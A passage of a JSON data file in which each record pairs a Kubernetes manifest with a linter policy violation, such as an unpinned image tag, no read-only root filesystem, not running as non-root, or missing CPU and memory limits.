    "violation_text": "The container \"hvpa-manager\" is using an invalid container image, \"ggaurav10/hvpa-controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01540",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hvpa-manager\" does not have a read-only root file system"
  },
  {
    "id": "01541",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hvpa-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "01542",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hvpa-manager\" has cpu request 0"
  },
  {
    "id": "01543",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hvpa-manager\" has memory limit 0"
  },
  {
    "id": "01544",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app2\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01545",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app2\" does not have a read-only root file system"
  },
  {
    "id": "01546",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app2\" is not set to runAsNonRoot"
  },
  {
    "id": "01547",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app2\" has cpu request 0"
  },
  {
    "id": "01548",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app2\" has memory limit 0"
  },
  {
    "id": "01549",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01550",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01551",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01552",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01553",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01554",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "01555",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "01556",
    "manifest_path": "data/manifests/the_stack_sample/sample_0517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kuard-a\" does not have a read-only root file system"
  },
  {
    "id": "01557",
    "manifest_path": "data/manifests/the_stack_sample/sample_0517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kuard-a\" is not set to runAsNonRoot"
  },
  {
    "id": "01558",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sidecar-injector\" does not have a read-only root file system"
  },
  {
    "id": "01559",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sidecar-injector\" has cpu request 0"
  },
  {
    "id": "01560",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sidecar-injector\" has memory limit 0"
  },
  {
    "id": "01561",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goapp\" does not have a read-only root file system"
  },
  {
    "id": "01562",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goapp\" is not set to runAsNonRoot"
  },
  {
    "id": "01563",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"goapp\" has cpu request 0"
  },
  {
    "id": "01564",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"goapp\" has memory limit 0"
  },
  {
    "id": "01565",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-udp-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "01566",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-udp-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "01567",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-udp-ingress-lb\" has cpu request 0"
  },
  {
    "id": "01568",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-udp-ingress-lb\" has memory limit 0"
  },
  {
    "id": "01569",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01570",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01571",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01572",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01573",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
